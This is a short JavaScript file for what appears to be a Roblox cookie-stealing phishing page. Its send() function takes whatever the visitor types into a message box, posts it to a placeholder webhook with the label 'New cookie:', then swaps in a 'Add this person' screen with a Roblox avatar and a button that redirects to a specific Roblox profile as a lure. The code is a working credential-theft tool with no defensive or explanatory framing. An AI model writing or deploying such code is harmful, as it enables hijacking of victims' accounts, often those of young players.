function send() {
  const message = document.getElementById("message").value;
  const status = document.getElementById("status");

  if (message.trim() === "") return;

  status.innerText = "Sending...";

  fetch("YOUR_WEBHOOK_HERE", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: "📩 New cookie: " + message
    })
  })
  .then(() => {
    status.innerText = "Sent successfully";

    setTimeout(() => {
      const container = document.getElementById("container");

      container.innerHTML = `
        <div style="
          height:100vh;
          display:flex;
          justify-content:center;
          align-items:center;
          flex-direction:column;
          color:white;
          text-align:center;
        ">
          <h1>Add this person 👇</h1>

          <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1986571504-Png/150/150/AvatarHeadshot/Webp/noFilter"
               style="border-radius:50%; margin:15px;">

          <button onclick="goToRoblox()" style="
            padding:12px 25px;
            border:none;
            border-radius:12px;
            background:#2563eb;
            color:white;
            cursor:pointer;
          ">
            CONTINUE →
          </button>
        </div>
      `;
    }, 2000);
  })
  .catch(() => {
    status.innerText = "Error sending message";
  });
}

function goToRoblox() {
  window.location.href = "https://www.roblox.com/users/1986571504/profile?friendshipSourceType=PlayerSearch";
}